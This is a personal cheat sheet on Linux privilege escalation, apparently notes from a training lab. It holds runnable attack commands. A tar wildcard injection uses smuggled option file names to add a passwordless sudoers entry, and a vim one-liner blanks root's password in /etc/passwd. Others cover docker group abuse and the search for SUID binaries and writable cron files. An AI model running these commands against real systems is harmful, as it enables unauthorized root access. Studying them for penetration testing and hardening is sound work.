# Content 
- [Environment-based Privilege Escalation](#environment-based-privilege-escalation)
    - [Path Abuse](#path-abuse)
    - [Wildcard Abuse](#wildcard-abuse)
    - [Escaping Restricted Shells](#escaping-restricted-shells)
- [Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)
    - [Special Permissions](#special-permissions)
    - [Sudo Rights Abuse](#sudo-rights-abuse)
    - [Privileged Groups](#privileged-groups)
    - [Capabilities](#capabilities)
- [Service-based Privilege Escalation]()


check [gtfobins](https://gtfobins.github.io/)

# Environment-based Privilege Escalation

## Path Abuse
we could replace a common binary such as ls with a malicious script such as a reverse shell.

```shell
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
```

## Wildcard Abuse
- [Linux-PrivEsc-Wildcard](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)

| Character | Significance                                                   |
|-----------|----------------------------------------------------------------|
| *         | An asterisk that can match any number of characters in a file name. |
| ?         | Matches a single character.                                    |
| [ ]       | Brackets enclose characters and can match any single one at the defined position. |
| ~         | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| -         | A hyphen within brackets will denote a range of characters.   |


### EX: privilege escalation in tar

- cron job
```shell
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
- By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options.
```
$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1

```

- check the dir , now when the job executed it will run our script  
```shell
$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

## Escaping Restricted Shells
- [escape restricted shells](https://0xffsec.com/handbook/shells/restricted-shells/)


# Permissions-based Privilege Escalation

## Special Permissions
```shell
# find binaries with setuid set
# It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. 
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# find binaries with setgid set
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
## Sudo Rights Abuse

```shell
sudo -l 
```

AppArmor in more recent distributions has predefined the commands used with the postrotate-command, effectively preventing command execution. Two best practices that should always be considered when provisioning sudo rights:

1. Always specify the absolute path to any binaries listed in the sudoers file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the sudoers entry specifies cat instead of /bin/cat this could likely be abused).

2. Grant sudo rights sparingly and based on the principle of least privilege. Does the user need full sudo rights? Can they still perform their job with one or two entries in the sudoers file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.

## Privileged Groups

### 1) LXC / LXD
all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root

### 2) Docker
- Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. 
- One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume.
- Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. 

### 3) Disk
- Users within the disk group have full access to any devices contained within /dev, such as `/dev/sda1`, which is typically the main device used by the operating system.
- An attacker with these privileges can use debugfs to access the entire file system with root level privileges. this could be leveraged to retrieve SSH keys, credentials or to add a user.

### 4) ADM
- Members of the adm group are able to read all logs stored in `/var/log`.
- This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.


## Capabilities 

Linux capabilities can be used to escalate a user's privileges to root check for more [exploit linux capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

| Capability       | Description                                                                                                                                           |
|------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| cap_setuid       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.                  |
| cap_setgid       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.                            |
| cap_sys_admin    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems. |
| cap_dac_override | Allows bypassing of file read, write, and execute permission checks.                                                                                   |

options

| Capability Values | Description  |
|-------------------|-----------------------------------------------------------------------------------------------------------------------------------|
| =                 | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. |
| +ep               | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. |
| +ei               | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
| +p                | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |


### Enumerating Capabilities

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Exploitation Capabilities

```shell
# check vim
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

# We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
/usr/bin/vim.basic /etc/passwd

# or
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.
```

# Service-based Privilege Escalation

## Vulnerable Services

check for avaialble services and binaries versions to see if there is available exploits 

#### EX: 
Screen. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

## Cron Job Abuse
- search for editable cron jobs
- even if the crontabe is only editable by the root user. You may find a world-writable script that is used in it and run as root 
- you can monitor the process using [pspy](https://github.com/DominicBreuker/pspy) without sudo privliage to know when the crontabe executed 
```shell
# Cron
find /etc -type d -name '*cron*' -exec sh -c 'echo "Parent Directory: $1"; ls -lah "$1"' sh {} \;

# find writable files or directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# monitor every seconed 
pspy64 -pf -i 1000
```
